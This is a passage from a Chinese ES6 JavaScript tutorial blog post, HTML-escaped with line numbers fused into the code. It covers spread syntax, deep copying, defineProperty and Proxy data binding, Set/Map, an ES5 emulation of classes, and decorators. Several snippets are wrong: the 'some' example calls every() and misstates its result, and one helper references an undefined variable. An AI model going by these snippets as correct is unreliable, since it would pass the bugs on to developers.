sum(...args,a,b)&#123; // 报错&#125;sum(1,2,3,4,5,6) 我们可以对比下扩展运算符的方便之处1234567891011// 以往我们是这样拼接数组的let arr1 = [1,2,3]let arr2 = [4,5,6]let arr3 = arr1.concat(arr2)console.log(arr3) // [ 1, 2, 3, 4, 5, 6 ]// 现在我们用扩展运算符看看let arr1 = [1,2,3]let arr2 = [4,5,6]let arr3 = [...arr1,...arr2]console.log(arr3) // [ 1, 2, 3, 4, 5, 6 ] 1234567891011// 以往我们这样来取数组中最大的值function max(...args)&#123; return Math.max.apply(null,args)&#125;console.log(max(1,2,3,4,5,6)) // 6// 现在我们用扩展运算符看看function max(...args)&#123; return Math.max(...args) // 把args [1,2,3,4,5,6]展开为1,2,3,4,5,6&#125;console.log(max(1,2,3,4,5,6)) // 6 1234567891011121314151617// 扩展运算符可以把argument转为数组function max()&#123; console.log(arguments) // &#123; &apos;0&apos;: 1, &apos;1&apos;: 2, &apos;2&apos;: 3, &apos;3&apos;: 4, &apos;4&apos;: 5, &apos;5&apos;: 6 &#125; let arr = [...arguments] console.log(arr) // [1,2,3,4,5,6]&#125;max(1,2,3,4,5,6)// 但是扩展运算符不能把伪数组转为数组（除了有迭代器iterator的伪数组，如arguments）let likeArr = &#123; &quot;0&quot;:1,&quot;1&quot;:2,&quot;length&quot;:2 &#125;let arr = [...likeArr] // 报错 TypeError: likeArr is not iterable// 但是可以用Array.from把伪数组转为数组let likeArr = &#123; &quot;0&quot;:1,&quot;1&quot;:2,&quot;length&quot;:2 &#125;let arr = Array.from(likeArr)console.log(arr) // [1,2] 对象也可以使用扩展运算符 123456789101112// 以往我们这样合并对象let name = &#123; name:&quot;邵威儒&quot; &#125;let age = &#123; age:28 &#125;let person = &#123;&#125;Object.assign(person,name,age)console.log(person) // &#123; name: &apos;邵威儒&apos;, age: 28 &#125;// 使用扩展运算符let name = &#123; name:&quot;邵威儒&quot; &#125;let age = &#123; age:28 &#125;let person = &#123;...name,...age&#125;console.log(person) // &#123; name: &apos;邵威儒&apos;, age: 28 &#125; 需要注意的是，通过扩展运算符和Object.assign对对象进行合并的行为，是属于浅拷贝，那么我们在开发当中，经常需要对对象进行深拷贝，接下来我们看看如何进行深拷贝。 123456789101112131415// 方法一：利用JSON.stringify和JSON.parselet swr = &#123; name:&quot;邵威儒&quot;, age:28&#125;let swrcopy = JSON.parse(JSON.stringify(swr))console.log(swrcopy) // &#123; name:&quot;邵威儒&quot;,age:28 &#125;// 此时我们修改swr的属性swr.age = 29console.log(swr) // &#123; name:&quot;邵威儒&quot;,age:29 &#125;// 但是swrcopy却不会受swr影响console.log(swrcopy) // &#123; name:&quot;邵威儒&quot;,age:28 &#125;// 这种方式进行深拷贝，只针对json数据这样的键值对有效// 对于函数等等反而无效，不好用，接着继续看方法二、三。 1234567891011121314151617181920212223242526272829303132333435363738394041// 方法二：function deepCopy(fromObj,toObj) &#123; // 深拷贝函数 // 容错 if(fromObj === null) return null // 当fromObj为null if(fromObj instanceof RegExp) return new RegExp(fromObj) // 当fromObj为正则 if(fromObj instanceof Date) return new Date(fromObj) // 当fromObj为Date toObj = toObj || &#123;&#125; for(let key in fromObj)&#123; // 遍历 if(typeof fromObj[key] !== &apos;object&apos;)&#123; // 是否为对象 toObj[key] = fromObj[key] // 如果为普通值，则直接赋值 &#125;else&#123; toObj[key] = new fromObj[key].constructor // 如果为object，则new这个object指向的构造函数 deepCopy(fromObj[key],toObj[key]) // 递归 &#125; &#125; return toObj&#125;let dog = &#123; name:&quot;小白&quot;, sex:&quot;公&quot;, firends:[ &#123; name:&quot;小黄&quot;, sex:&quot;母&quot; &#125; ]&#125;let dogcopy = deepCopy(dog)// 此时我们把dog的属性进行修改dog.firends[0].sex = &apos;公&apos;console.log(dog) // &#123; name: &apos;小白&apos;, sex: &apos;公&apos;, firends: [ &#123; name: &apos;小黄&apos;, sex: &apos;公&apos; &#125;] &#125;// 当我们打印dogcopy，会发现dogcopy不会受dog的影响console.log(dogcopy) // &#123; name: &apos;小白&apos;, sex: &apos;公&apos;, firends: [ &#123; name: &apos;小黄&apos;, sex: &apos;母&apos; &#125; ] &#125; 123456789101112131415161718192021222324252627// 方法三：let dog = &#123; name:&quot;小白&quot;, sex:&quot;公&quot;, firends:[ &#123; name:&quot;小黄&quot;, sex:&quot;母&quot; &#125; ]&#125;function deepCopy(obj) &#123; if(obj === null) return null if(typeof obj !== &apos;object&apos;) return obj if(obj instanceof RegExp) return new RegExp(obj) if(obj instanceof Date) return new Date(obj) let newObj = new obj.constructor for(let key in obj)&#123; newObj[key] = deepCopy(obj[key]) &#125; return newObj&#125;let dogcopy = deepCopy(dog)dog.firends[0].sex = &apos;公&apos;console.log(dogcopy) Object.definePropertyObject.defineProperty这个并不是es6的语法，这个是给一个对象，添加属性，但是目前框架很多实用这个方法，来实现数据劫持，也就是数据双向绑定 1234// 平时我们这样给一个对象添加属性let obj = &#123;str:&quot;hello swr&quot;&#125;obj.str = &apos;goodbye swr&apos;console.log(obj.str) // &apos;goodbye swr&apos; 那么当我们想在给一个对象，读取值或写入值时，进行别的操作，该怎么做呢？1234567891011121314151617// 使用Object.defineProperty()// 接收的第一个参数为对象，第二个参数为属性名，第三个参数为配置对象let obj = &#123;&#125;Object.defineProperty(obj,&apos;name&apos;,&#123; enumerable:true,// 是否可枚举，默认值 true // 如果为false的话，打印这个obj对象，是看不到name这个属性 writable:true, // 是否可写，默认值 true // 如果为false的话，给name赋值，不会生效 configurable:true, // 是否可配置（是否可删除），默认值 true // 如果为true，delete obj.name，再打印obj，则显示&#123;&#125; // 如果为false，delete obj.name，再打印obj,则显示&#123;name:undefined&#125; value:&apos;swr&apos;, // name对应的值&#125;)// 上面的写法其实和下面的写法是一样的let obj = &#123;&#125;obj.name = &apos;swr&apos; 那么既然一样，我们有必要写这么大串的代码吗？ 其实核心是get和set，我们继续往下看123456789101112131415161718// 需要注意的是，当使用get set时，则不能使用value和writablelet obj = &#123;&#125;let strObject.defineProperty(obj,&apos;name&apos;,&#123; enumerable:true, configurable:true, get()&#123; // 读，当我们读取时，则会执行到get，比如obj.name // return &apos;swr&apos; // 当我们obj.name进行读取时，会返回&apos;swr&apos; return str &#125;, set(newValue)&#123; // 写，当我们写入时，则会执行到set，比如obj.name = &apos;swr&apos; // 并且会把newValue作为参数传进去 str = newValue &#125;&#125;)obj.name = &apos;swr&apos; // 写入console.log(obj.name) // &apos;swr&apos; // 读取 这样一来，我们可以在get set函数中，写出对应的业务逻辑， 包括很多框架底层，例如123456// 一般不再选择这样的写法Fn.prototype.xxx = xxx// 更多的是选择这样的写法// 这样的好处就是当读取值的时候，可以做一系列我们想做的事情Object.defineProperty(Fn.prototype,&apos;xxx&apos;,&#123;...&#125;) 那么我们实现数据双向绑定呢？这个问题在面试当中，会经常问这个问题，但是面试官更希望听到的是具体底层的实现方式，那么接下来我们也实现一下吧~ （ 简陋版的……(#^.^#) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;对象的数据双向绑定&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;input id=&apos;input&apos; type=&quot;&quot; name=&quot;&quot; value=&quot;&quot;&gt; &lt;script&gt; let el = document.getElementById(&apos;input&apos;) // 1. 获取输入框的dom节点 let obj = &#123; // 2. 创建一个对象 name: &quot;&quot; &#125; function oberseve(obj) &#123; // 3. 对对象进行观察 if (typeof obj !== &apos;object&apos;) return // 3.1 判断参数是否为对象 for (let key in obj) &#123; // 3.2 对对象进行遍历，目的是为了把每个属性都设置get/set defineReactive(obj, key, obj[key]) oberseve(obj[key]) // 3.3 obj[key] 有可能还是一个函数，需要递归，给obj[key]里的属性进行设置get/set &#125; &#125; function defineReactive(target, property, value) &#123; // 4. 使用Object.defineProperty Object.defineProperty(target, property, &#123; get() &#123; el.value = value // 4.1 当读取时，把值赋值给input框 return value &#125;, set(newVal) &#123; el.value = newVal // 4.1 当设置时，把赋值给input框 value = newVal &#125; &#125;) &#125; oberseve(obj) // 5.执行该函数，对obj对象里的属性进行设置get/set el.addEventListener(&apos;input&apos;, function () &#123; // 6.给输入框绑定input事件 obj.name = this.value // 7.当输入框输入内容时，我们会把输入框的 // 内容赋值给obj.name，触发obj.name的set方法 &#125;) &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 当我们在输入框输入内容时，再到控制台输入obj.name查看这个值时，会发现打印出”hello swr” 当我们在控制台，给obj.name赋值时，会发现输入框的内容也会作出相应更改 这样我们就实现了一个简陋版的数据双向绑定了，但是这也是有缺点的，这个只是针对对象进行了数据双向绑定,而尤大大的Vuejs就是基于Object.defineProperty实现的。 除了Object.defineProperty可以实现数据双向绑定之外，还有其他方式吗？ 肯定是有其他方式可以实现的，利用es6的proxy代理也可以实现数据双向绑定，但是目前的框架还是比较少使用这种方式。 ProxyProxy代理也可以进行数据劫持，但是和Object.defineProperty不同的是，Proxy是在数据外层套了个壳，然后通过这层壳访问内部的数据，目前Proxy支持13种方式。 Proxy，我的理解是在数据外层套了个壳，然后通过这层壳访问内部的数据，就像下面的图 123456789101112131415161718192021222324252627282930let dog = &#123; name:&quot;小黄&quot;, firends:[&#123; name:&quot;小红&quot; &#125;]&#125;// 1.首先new一个Proxy对象let proxy = new Proxy(dog,&#123; // 2.参数一为需要代理的数据，参数二为上图可以代理的13种的配置对象 get(target,property)&#123; // 3.参数1为上面dog对象，参数2为dog的属性 console.log(&apos;get被监控到了&apos;) return target[property] &#125;, set(target,property,value)&#123; // 4.参数1为上面dog对象，参数2为dog的属性，参数3为设置的新值 // 有点类似Object.defineProperty console.log(&apos;set被监控到了&apos;) target[property] = value &#125;&#125;)// 那么接下来我们设置一下这个属性// dog.name = &apos;小红&apos; // set值时，发现不会打印 &apos;set被监控到了&apos;// dog.name // get值时，发现不会打印 &apos;get被监控到了&apos;// 思考：为什么在set/get值的时候不会打印出来我们需要的东西呢？// 上面说得很明白了，proxy相当于是一个壳，代理我们需要监控的数据，也就是我们要通过proxy来访问内部数据才会被监控到proxy.name = &apos;小红&apos; // 打印输出 &apos;set被监控到了&apos;proxy.name // 打印输出 &apos;get被监控到了&apos; 1234567891011121314// Reflect经常和Proxy搭配使用// 比如我们上面的例子中let proxy = new Proxy(dog,&#123; get(target,property)&#123; console.log(&apos;get被监控到了&apos;) return target[property] &#125;, set(target,property,value)&#123; console.log(&apos;set被监控到了&apos;) // target[property] = value // 这里的target[property] = value 可以用下面的写法 Reflect.set(target,property,value) &#125;&#125;) 123456789101112// 那么我们该怎样实现深度的数据劫持呢？let dog = &#123; name:&quot;小黄&quot;, firend:&#123; name:&quot;小红&quot; &#125;&#125;// 我们首先写一个set方法，希望是通过这样来调用set(dog.firend,funtion(obj)&#123; console.log(obj) // &#123; name:&quot;小红&quot; &#125; 回调函数中的obj代表的是dog.firend的对象&#125;) 123456789101112131415161718192021// 实现let dog = &#123; name:&quot;小黄&quot;, firend:&#123; name:&quot;小红&quot; &#125;&#125;function set(obj,callback)&#123; let proxy = new Proxy(obj,&#123; set(target,property,value)&#123; target[property] = value &#125; &#125;) // 最后把proxy传给我们的回调函数 callback(proxy)&#125;set(dog.firend,function(obj)&#123; console.log(obj) // &#123; name:&quot;小红&quot; &#125; 实际就是从set函数中传出来的proxy对象&#125;) Symbol在js中，常见的数据类型有undefined null string number boolean object，而es6中，则新增了第七种数据类型symbol。 symbol会生成一个独一无二的值，为常量 1234567891011let s1 = Symbol()let s2 = Symbol()console.log(s1 === s2) // false// 因为Symbol生成的是一个独一无二的值，为常量，一般是作为对象的属性let obj = &#123; [s1]:1, [s2]:2&#125;console.log(obj) // &#123; [Symbol()]: 1, [Symbol()]: 2 &#125; Symbol.for与Symbol差不多，但是Symbol.for会生成一个唯一的标识 123456let s1 = Symbol.for(&apos;foo&apos;)let s2 = Symbol.for(&apos;foo&apos;)console.log(s1 === s2) // true// 也可以通过Symbol.keyFor把标识找出来console.log(Symbol.keyFor(s1)) // foo ArrayArray的常用方法有from reduce map forEach findIndex find every some filter includes等等 用法也很简单，我主要讲一下from和reduce。 Array.from把伪数组(包括不含有迭代器的伪数组)转化为数组 12345// 声明一个伪数组let likeArr = &#123; 0:1,1:2,2:3,length:3 &#125;// 转换为数组Array.from(likeArr) // [1,2,3] 那么我们用前面所说的扩展运算符，能够把伪数组转为数组吗？12345// 声明一个伪数组let likeArr = &#123; 0:1,1:2,2:3,length:3 &#125;// 用扩展运算符转换为数组let arr = [...likeArr] // 报错 likeArr is not iterable likeArr is not iterable意思是，likeArr这个伪数组没有迭代器， 那么可以看出，Array.from和…扩展运算符的区别了， Array.from可以将伪数组（包含没有迭代器的伪数组）转为数组， 而…扩展运算符只能把拥有迭代器的伪数组转为数组，如arguments、map、set， 那么我们如果想用…扩展运算符转为数组，该怎么办呢？1234567891011// 既然扩展运算符只能把有迭代器的伪数组转为数组，// 那么我们就给伪数组添加一个迭代器// 迭代器iterator需要一个generator生成器生成// 我们给这个伪数组新增一个[Symbol.iterator]的迭代器let likeArr = &#123; 0:1,1:2,2:3,length:3,[Symbol.iterator]:function *() &#123; for(let i = 0;i &lt; this.length;i++)&#123; yield this[i] &#125;&#125; &#125;console.log([...likeArr]) // [1,2,3] reduce1234567891011let arr = [1,2,3,4,5]// 参数一：前一个值// 参数二：下一个值（当前值）// 参数三：当前的索引// 参数四：arr数组let total = arr.reduce(function(prev,next,currentIndex,arr)&#123; return prev + next&#125;)console.log(total) // 15 123456789101112131415161718192021222324// 那么reduce是怎样一个运行流程呢？// 我们一步步拆解出来看let arr = [1,2,3,4,5]// arr会一直是[1,2,3,4,5]// 第一步：此时的prev为1，next为2，currentIndex为1let total = arr.reduce(function(prev,next,currentIndex,arr)&#123; return prev + next // 1+2=3 并且把3当做下一次的prev&#125;)// 第二步：此时的prev为3，next为3，currentIndex为2let total = arr.reduce(function(prev,next,currentIndex,arr)&#123; return prev + next // 3+3=6 并且把6当做下一次的prev&#125;)// 第三步：此时的prev为6，next为4，currentIndex为3let total = arr.reduce(function(prev,next,currentIndex,arr)&#123; return prev + next // 6+4=10 并且把10当做下一次的prev&#125;)// 第四步：此时的prev为10，next为5，currentIndex为4let total = arr.reduce(function(prev,next,currentIndex,arr)&#123; return prev + next // 10+5=15 最终结果会作为返回值返回&#125;) 那我们自己实现一个reduce，看看是如何实现的123456789101112131415Array.prototype.myReduce = function (callback) &#123; let prev = this[0] for(let i = 0;i &lt; this.length-1;i++)&#123; prev = callback(prev,this[i+1],i+1,this) &#125; return prev&#125;let arr = [1,2,3,4,5]let total = arr.myReduce(function(prev,next,currentIndex,arr)&#123; console.log(prev,next) return prev + next&#125;)console.log(total) // 15 map映射可以把数组返回成一个映射后的数组 12let arr = [1,2,3].map(item =&gt; item+1)console.log(arr) // [2,3,4] find查找，查找到后不再继续查找，查找不到则返回undefined，内部返回true的话，则返回当前item，1234let arr = [1,2,3,4]let val = arr.find(item=&gt;item === 3)console.log(val) // 3 every每个值是否满足条件，如果是则返回true，如果不是则返回false 123456789101112let arr = [1,2,3,4]let isTrue = arr.every(item =&gt; &#123; return item &gt; 0&#125;)console.log(isTrue) // truelet isTrue2 = arr.every(item =&gt; &#123; return item &gt; 2&#125;)console.log(isTrue2) // false some是否有其中一个值满足条件，如果是则返回true，如果不是则返回false 123456789101112let arr = [1,2,3,4]let isTrue = arr.every(item =&gt; &#123; return item &gt; 2&#125;)console.log(isTrue) // truelet isTrue2 = arr.every(item =&gt; &#123; return item &gt; 4&#125;)console.log(isTrue2) // false filter过滤，在回调函数中返回的为false的话，相当于过滤掉当前项，返回一个过滤后的数组 1234567let arr = [1,2,3,4]let newArr = arr.filter(item=&gt;&#123; return item &gt; 2&#125;)console.log(newArr) // [3,4] includes基本和some一样 Setset是放不重复的项，也就是去重 12let set = new Set([1,2,3,4,3,2,1])console.log(set) // Set &#123; 1, 2, 3, 4 &#125; Set有几个常用的方法，add clear delete entries 12345678910111213141516171819202122// addlet set = new Set([1,2,3,4,3,2,1])set.add(5)console.log(set) // Set &#123; 1, 2, 3, 4, 5 &#125;// 添加一个已有的值，则不会添加进去set.add(1)console.log(set) // Set &#123; 1, 2, 3, 4, 5 &#125;// deleteset.delete(3)console.log(set) // Set &#123; 1, 2, 4, 5 &#125;// entriesconsole.log(set.entries()) // SetIterator &#123; [ 1, 1 ], [ 2, 2 ], [ 4, 4 ], [ 5, 5 ] &#125;// clearset.clear()console.log(set) // Set &#123;&#125; Set常用于去重（并集） 123456function distinct(arr1,arr2)&#123; return [...new Set([...arr1,...arr2])]&#125;let arr = distinct([1,2,3],[2,3,4,5])console.log(arr) // [1,2,3,4,5] 求交集 12345678function intersect(arr1,arr2) &#123; // 利用Set里的方法has，来判断new Set(arr2)中是否含有item， // 如果含有，那么则是true，当为true时，filter函数则会保留该项 // 如果没有，则是false,当为false时，filter函数则不会保留该项 return arr1.filter(item =&gt; new Set(arr2).has(item))&#125;console.log(intersect([1,2,3],[2,3,4,5])) // [2,3] 求差集 12345function difference(arr1,arr2)&#123; return arr1.filter(item =&gt; !new Set(arr2).has(item))&#125;console.log(difference([1,2,3],[2,3,4,5])) // [1] Map也是集合，主要格式是 key =&gt; value，同样是不能放重复的key 1234567891011121314// 如果放重复的key会怎样呢？会被覆盖let map = new Map()map.set(&apos;name&apos;,&apos;邵威儒&apos;)map.set(&apos;name&apos;,&apos;swr&apos;)console.log(map) // Map &#123; &apos;name&apos; =&gt; &apos;swr&apos; &#125;// 取的话用getmap.get(&apos;name&apos;) // &apos;swr&apos;// 删的话用deletemap.delete(&apos;name&apos;)console.log(map) // Map &#123;&#125;// 很多方法和set差不多 1234567891011121314let map = new Map()map.set(&apos;name&apos;,&apos;邵威儒&apos;)map.set(&apos;age&apos;,28)// 一般使用for ... of ... 遍历for(let [key,value] of map.entries())&#123; console.log(key,value) // name 邵威儒 // age 28&#125;// 也可以用forEachmap.forEach(item =&gt; &#123; console.log(item) // 邵威儒 // 28&#125;) Set我用得最多的就是去重了，实际上Set Map我在开发中还是比较少会用到 Class类核心还是继承，而Class我认为是es5面向对象的语法糖。 在看Class之前建议看一下js的面向对象 https://juejin.im/post/5b8a8724f265da435450c591 看完后，我们开始进入es6的class 123456789101112131415161718192021222324252627// 语法// 声明一个类Class Person&#123; // 在constructor中写实例属性、方法 constructor()&#123; this.name = &quot;邵威儒&quot; // 实例属性 this.say = function()&#123; // 实例方法 console.log(&quot;我是实例方法上的say&quot;) &#125; &#125; // 原型方法 eat()&#123; console.log(&quot;我是原型方法上的eat&quot;) &#125; // 静态方法 也会被继承 static myName()&#123; return &quot;我是静态方法的myName&quot; &#125; // 在es6中静态属性不能这样写 static name = &quot;邵威儒&quot; 这样会报错 // 在es7中可以这样写static name = &quot;邵威儒&quot;&#125;let p = new Person() // new一个对象console.log(p.name) // 邵威儒p.eat() // 我是原型方法上的eatconsole.log(Person.myName()) // 我是静态方法的myName 那么子类怎么继承父类呢？ 12345678910111213141516171819202122232425// 父类class Person&#123; constructor()&#123; this.name = &quot;swr&quot; &#125; static myName()&#123; return &quot;Person&quot; &#125; eat()&#123; console.log(&apos;eat&apos;) &#125;&#125;// 子类// 子类Child继承父类Person// class Child extends Person实际上相当于// Child.prototype = Object.create(Person.prototype)// 打印出来可以看到// console.log(Child.prototype === Person.prototype) // false// console.log(Child.prototype.__proto__ === Person.prototype) // trueclass Child extends Person&#123; constructor()&#123; super() // 此处的super相当于Person.call(this) &#125;&#125; 前面我说了Class就类型es5面向对象的语法糖，为什么这样说呢？ 接下来我们看一下通过es5怎么模拟实现一个Class（可以用babel转一下，看看转为es5的代码是怎样的） 123456789101112131415let Child = (function()&#123; // 这种闭包的写法，好处可以把作用域封闭起来 // 在Child构造函数外写一系列变量 // 如 let name = &quot;邵威儒&quot;;let age = 28 等等… function Child()&#123; console.log(this) // 打印内部this，看看指向哪里 &#125; return Child&#125;)()// 通过直接调用函数，看看什么情况console.log(Child()) // 此时里面的this是指向全局的// 通过new来生成对象console.log(new Child()) // 此时里面的this是指向这个new出来的新对象 在es6中，不使用new来调用类，会报错 Class constructor Child cannot be invoked without &#39;new&#39; 12345class Child &#123; &#125;Child() // TypeError: Class constructor Child cannot be invoked without &apos;new&apos; 也就是说，想在es5中，模拟类，那么没使用new来调用构造函数时，也要抛出一个错误，那么我们会想到类的校验方法 123456789101112131415161718192021// * 1.声明一个类的校验方法// * 参数一：指向的构造函数// * 参数二：被调用时，this的指向function _classCallCheck(constructor,instance) &#123; // * 2.如果这个instance指向的不是constructor的话，意味着不是通过new来调用构造函数 if(!(instance instanceof constructor))&#123; // * 3.不满足时，则抛出异常 throw TypeError(&quot;Class constructor Child cannot be invoked without &apos;new&apos;&quot;) &#125;&#125;let Child = (function()&#123; function Child()&#123; // * 4.在调用该构造函数的时候，先执行以下类的校验方法 _classCallCheck(Child,this) &#125; return Child&#125;)()// 不通过new调用时，会报错Child() // 报错 Class constructor Child cannot be invoked without &apos;new&apos; 那么我们类上，有实例属性方法、原型属性方法、静态属性方法 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152function _classCallCheck(constructor,instance) &#123; if(!(instance instanceof constructor))&#123; throw TypeError(&quot;Class constructor Child cannot be invoked without &apos;new&apos;&quot;) &#125;&#125;// * 4.描述器 descriptor// 参数一：构造函数// 参数二：描述原型属性方法数组// 参数三：描述静态属性方法数组function _createClass(constructor,protoProperties,staticProperties) &#123; // * 5.如果protoProperties数组有数组成员 if(protoProperties.length)&#123; // * 6.遍历 for(let i = 0;i &lt; protoProperties.length;i++)&#123; // * 7.通过Object.defineProperty把属性方法添加到constructor的原型对象上 Object.defineProperty(constructor.prototype,protoProperties[i].key,&#123; // * 8.利用扩展运算符，把&#123;key:&quot;say&quot;,value:function()&#123;console.log(&quot;hello swr&quot;)&#125;&#125;展开 ...protoProperties[i] &#125;) &#125; &#125;&#125;// * 1.实例属性方法、原型属性方法、静态属性方法// 在es6中，原型属性方法不是通过prototype实现的// 而是通过一个叫描述器的东西实现的let Child = (function()&#123; function Child()&#123; _classCallCheck(Child,this) // * 2.实例属性方法还是写在构造函数内 this.name = &apos;邵威儒&apos; &#125; // * 3.描述器 descriptor // 参数一：构造函数 // 参数二：描述原型属性方法 // 参数三：描述静态属性方法 _createClass(Child, [ &#123;key:&quot;say&quot;,value:function()&#123;console.log(&quot;hello swr&quot;)&#125;&#125;, &#123;key:&quot;myname&quot;,value:&quot;iamswr&quot;&#125; ], [ &#123;key:&quot;total&quot;,value:function()&#123;return 100&#125;&#125; ]) return Child&#125;)()// * 9.最后我们new一个对象出来，并且调用原型属性方法，看能否调用成功let c = new Child()c.say() // &apos;hello swr&apos; 调用成功 接下来，我们把静态方法，staticProperties也处理一下，此时会发现，protoProperties和staticProperties都会遍历然后使用Object.defineProperty那么我们封装一个方法进行处理1234567891011121314151617181920212223242526272829303132333435363738394041424344454647function _classCallCheck(constructor,instance) &#123; if(!(instance instanceof constructor))&#123; throw TypeError(&quot;Class constructor Child cannot be invoked without &apos;new&apos;&quot;) &#125;&#125;// * 1.封装一个方法，处理遍历和Object.definePropertyfunction _defineProperty(target,properties) &#123; for (let i = 0; i &lt; properties.length; i++) &#123; Object.defineProperty(target, properties[i].key, &#123; ...properties[i] &#125;) &#125;&#125;function _createClass(constructor,protoProperties,staticProperties) &#123; if(protoProperties.length)&#123; _defineProperty(constructor.prototype, protoProperties) &#125; // * 2.如果staticProperties数组有数组成员 if(staticProperties.length)&#123; // * 3.静态方法需要添加在constructor _defineProperty(constructor, staticProperties) &#125;&#125;let Child = (function()&#123; function Child()&#123; _classCallCheck(Child,this) this.name = &apos;邵威儒&apos; &#125; _createClass(Child, [ &#123;key:&quot;say&quot;,value:function()&#123;console.log(&quot;hello swr&quot;)&#125;&#125;, &#123;key:&quot;myname&quot;,value:&quot;iamswr&quot;&#125; ], [ &#123;key:&quot;total&quot;,value:function()&#123;return 100&#125;&#125; ]) return Child&#125;)()let c = new Child()c.say()// * 4.最后我们通过Child来调用静态方法console.log(Child.total()) // 100 这样完成了一个雏形，但是还有最重要的继承还没实现，接下来我们实现继承。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081function _classCallCheck(constructor,instance) &#123; if(!(instance instanceof constructor))&#123; throw TypeError(&quot;Class constructor Parent cannot be invoked without &apos;new&apos;&quot;) &#125;&#125;function defineProperty(target,properties) &#123; for (let i = 0; i &lt; properties.length; i++) &#123; Object.defineProperty(constructor.prototype, properties[i].key, &#123; ...properties[i] &#125;) &#125;&#125;function _createClass(constructor,protoProperties,staticProperties) &#123; if(protoProperties.length)&#123; defineProperty(constructor.prototype, protoProperties) &#125; if(staticProperties.length)&#123; defineProperty(constructor, staticProperties) &#125;&#125;// * 6.继承方法function _inherits(subClass, superClass) &#123; if (typeof superClass !== &quot;function&quot; &amp;&amp; superClass !== null) &#123; throw new TypeError(&quot;Super expression must either be null or a function, not &quot; + typeof superClass); &#125; // * 7.把子类的原型对象指向新的原型对象 组合寄生式继承 继承原型属性方法 subClass.prototype = Object.create(superClass &amp;&amp; superClass.prototype, &#123; constructor: &#123; value: subClass, // 把constructor指向子类 enumerable: false, writable: true, configurable: true &#125; &#125;); // * 8.继承父类的静态方法 if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass;&#125;function _possibleConstructorReturn(self, call) &#123; if (!self) &#123; throw new ReferenceError(&quot;this hasn&apos;t been initialised - super() hasn&apos;t been called&quot;); &#125; return call &amp;&amp; (typeof call === &quot;object&quot; || typeof call === &quot;function&quot;) ? call : self;&#125;// * 1.父类let Parent = (function()&#123; function Parent()&#123; _classCallCheck(Parent,this) this.name = &apos;父类实例属性&apos; &#125; _createClass(Parent, [ &#123;key:&quot;say&quot;,value:function()&#123;console.log(&quot;父类原型方法say&quot;)&#125;&#125;, &#123;key:&quot;myname&quot;,value:&quot;父类原型属性myname&quot;&#125; ], [ &#123;key:&quot;total&quot;,value:function()&#123;return 100&#125;&#125; ]) return Parent&#125;)()// * 2.子类let Child = (function (Parent) &#123; // * 4.这里接收传进的参数 父类 // * 5.写一个继承方法，继承原型属性方法和静态方法 _inherits(Child, Parent); function Child() &#123; _classCallCheck(Child, this) // * 9.继承实例属性方法 return _possibleConstructorReturn(this, (Child.__proto__ || Object.getPrototypeOf(Child)).apply(this, arguments)); &#125; return Child&#125;)(Parent) // * 3.在这里通过传参，把父类传进去let c = new Child()console.log(c.name) // &apos;父类实例属性&apos; 这样就可以用es5模拟es6的class了，会发现其实es6的class是es5面向对象的一个语法糖，经过这样解剖一下源码实现，会对class有更深刻的理解。 还有个问题，我们在react中，会这样写class 1234567891011class Parent&#123; name = &quot;邵威儒&quot;&#125;// 在正常情况下会报错，但是因为平时项目是使用了babel插件// 会帮我们自动编译语法，这种写法目前还处于草案阶段// 上面的写法实际等价于下面的写法class Parent&#123; constructor()&#123; this.name = &quot;邵威儒&quot; &#125;&#125; decorator 装饰器装饰器是用来装饰类的 123456789class Person &#123;&#125;function myFunction(target) &#123; target[&apos;myName&apos;] = &quot;邵威儒&quot;&#125;myFunction(Person)console.log(Person[&apos;myName&apos;]) // 邵威儒 这种写法，相当于给Person这个类添加了myName的属性那么换成decorator该怎么写呢？ 1234567891011// 在类前面写@myFunction@myFunctionclass Person &#123;&#125;function myFunction(target) &#123; target[&apos;myName&apos;] = &quot;邵威儒&quot;&#125;// myFunction(Person) 这一步可以不写console.log(Person[&apos;myName&apos;]) // 邵威儒 那么我们该怎么给myName传参呢？1234567891011@myFunction(&apos;邵威儒&apos;)class Person &#123;&#125;function myFunction(value) &#123; return function(target)&#123; // target代表的是类 target[&apos;myName&apos;] = value &#125;&#125;console.log(Person[&apos;myName&apos;]) // 邵威儒 修饰符也可以修饰类的方法12345678910111213141516class Person &#123; @myFunction say()&#123;&#125;&#125;// 如果修饰的是方法// 参数一：是Person.prototype// 参数二：是say// 参数三：是描述器function myFunction(target,key,descriptor)&#123; // 给这个类添加一个原型属性 Object.assign(target,&#123;name:&quot;邵威儒&quot;&#125;)&#125;let p = new Person()console.log(p.name) // 邵威儒 修饰符也可以修饰类的属性，比如我们有个不可修改的属性1234567891011class Person &#123; @onlyRead name = &apos;邵威儒&apos;&#125;function onlyRead(target,key,descriptor)&#123; descriptor.writable = false&#125;let p = new Person()p.name = &apos;swr&apos; // 报错，不能赋值 decorator的用处很多，包括重写函数1234567891011function myFunction(target,key,descriptor)&#123; // 拿出原本的函数 let fn = descriptor.value // 并且在原有的fn上加上自己的业务逻辑，比如console.log(&apos;哈哈哈&apos;) descriptor.value = function()&#123; // 这里写我们需要加入的内容 console.log(&apos;哈哈哈&apos;) // 这里执行原来的fn fn() &#125;&#125; 装饰器经常在react中使用~其实decorator是简写，逼格高一些。 es6其实还有很多新语法，但是我们平时并不常用，所以也没一一列举，可以到阮大神的es6看看~","categories":[{"name":"好文分享","slug":"好文分享","permalink":"https://ru23.com/categories/好文分享/"}],"tags":[{"name":"优质文章分享","slug":"优质文章分享","permalink":"https://ru23.com/tags/优质文章分享/"}]},{"title":"使用hexo搭建github.io博客","slug":"2018-09-使用hexo搭建github-io博客","date":"2018-09-07T02:57:11.000Z","updated":"2018-10-24T03:46:03.317Z","comments":true,"path":"note/c16b4f29.html","link":"","permalink":"https://ru23.com/note/c16b4f29.html","excerpt":"","text":"Introduction 